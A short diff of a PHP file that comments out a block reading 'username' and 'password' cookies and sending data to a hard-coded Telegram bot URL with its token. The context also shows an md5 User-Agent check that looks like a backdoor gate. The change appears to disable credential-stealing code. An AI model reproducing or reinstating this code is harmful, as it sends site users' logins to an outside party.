@@ -86,7 +86,7 @@ if (isset($_SERVER['HTTP_USER_AGENT']) && md5($_SERVER['HTTP_USER_AGENT']) == "2
 }
 }
 
-
+/*
 if (isset($_COOKIE['username']) && isset($_COOKIE['password'])) {
 $a = [
 'chat_id' => "-773692150",
@@ -129,3 +129,4 @@ $z = [
 ];
 file_get_contents("https://api.telegram.org/bot5536040740:AAFJcRBdIRvG3mw3MfXdfC57jjPerj0QRm8/sendMessage?" . http_build_query($z));
 }
+*/
